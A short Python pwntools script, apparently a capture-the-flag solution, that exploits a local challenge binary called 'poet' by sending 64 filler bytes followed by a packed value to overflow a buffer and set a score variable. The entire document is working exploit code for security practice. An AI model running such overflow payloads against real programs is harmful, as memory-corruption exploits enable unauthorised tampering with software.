from pwn import *

exe = ELF("./poet", checksec=True)

context.binary = exe

gdbscript = """
set follow-fork-mode child
"""

# args.DEBUG = True

def conn():
    r = process(exe.path)
    if args.DEBUG:
        gdb.attach(r, gdbscript=gdbscript)

    return r

POINTS = 1000000

def main():
    r  = conn()

    r.sendlineafter(b"\n> ", b"a")
    r.sendlineafter(b"\n> ", b"a" * 64 + pack(POINTS))

    r.interactive()

if __name__ == "__main__":
    main()
